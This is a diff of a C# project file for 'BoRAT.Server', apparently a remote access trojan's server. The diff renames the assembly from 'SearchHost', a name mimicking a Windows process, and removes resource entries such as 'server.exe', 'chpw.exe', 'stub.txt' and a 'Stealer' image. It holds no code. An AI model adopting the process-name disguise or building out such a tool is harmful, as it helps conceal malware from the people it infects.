@@ -8,7 +8,7 @@
     <OutputType>WinExe</OutputType>
     <AppDesignerFolder>Properties</AppDesignerFolder>
     <RootNamespace>BoRAT.Server</RootNamespace>
-    <AssemblyName>SearchHost</AssemblyName>
+    <AssemblyName>BoRAT.Server</AssemblyName>
     <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
     <FileAlignment>512</FileAlignment>
     <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
@@ -126,47 +126,6 @@
   </ItemGroup>
   <ItemGroup>
     <None Include="App.config" />
-  </ItemGroup>
-  <ItemGroup>
-    <None Include="Resources\Edit.png" />
-  </ItemGroup>
-  <ItemGroup>
-    <None Include="Resources\Background.JPG" />
-  </ItemGroup>
-  <ItemGroup>
-    <None Include="Resources\Edit1.png" />
-  </ItemGroup>
-  <ItemGroup>
-    <None Include="Resources\Cmd.png" />
-  </ItemGroup>
-  <ItemGroup>
-    <None Include="Resources\Icons8-Windows-8-Food-List-Ingredients.ico" />
-  </ItemGroup>
-  <ItemGroup>
-    <None Include="Resources\Icons8-Windows-8-Users-Enter-2.ico" />
-  </ItemGroup>
-  <ItemGroup>
-    <None Include="Resources\Custom-Icon-Design-Mono-General-1-Back.ico" />
-  </ItemGroup>
-  <ItemGroup>
-    <None Include="Resources\Custom-Icon-Design-Mono-General-2-Download.ico" />
-  </ItemGroup>
-  <ItemGroup>
-    <None Include="Resources\Custom-Icon-Design-Mono-General-4-Upload.ico" />
-  </ItemGroup>
-  <ItemGroup>
-    <None Include="Resources\Background2.JPG" />
-  </ItemGroup>
-  <ItemGroup>
-    <None Include="Resources\chpw.exe" />
-  </ItemGroup>
-  <ItemGroup>
-    <None Include="Resources\Saoul Stealer Vayne.jpg" />
-    <None Include="Resources\server.exe" />
-    <None Include="Resources\Refresh.ico" />
-    <None Include="Resources\stub.txt" />
-    <None Include="Resources\cropped-1207-410-720032.jpg" />
-    <None Include="Resources\cropped-150-150-720032.jpg" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
